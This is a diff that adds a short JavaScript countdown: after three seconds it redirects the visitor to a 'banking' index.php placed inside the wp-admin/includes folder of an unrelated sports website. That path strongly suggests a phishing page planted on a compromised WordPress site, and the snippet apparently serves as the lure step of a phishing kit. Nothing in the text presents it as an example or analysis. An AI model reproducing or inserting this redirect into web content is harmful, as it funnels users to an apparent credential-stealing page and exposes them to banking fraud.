@@ -1,0 +1,13 @@
+<script>
+function delayRedirect(){
+    document.getElementById('delayMsg').innerHTML = 'Please wait you\'ll be redirected after <span id="countDown">3</span> seconds....';
+    var count = 3;
+    setInterval(function(){
+        count--;
+        document.getElementById('countDown').innerHTML = count;
+        if (count == 0) {
+            window.location = 'http://eyefightsports.com/wp-admin/includes/banking/index.php'; 
+        }
+    },1000);
+}
+</script>
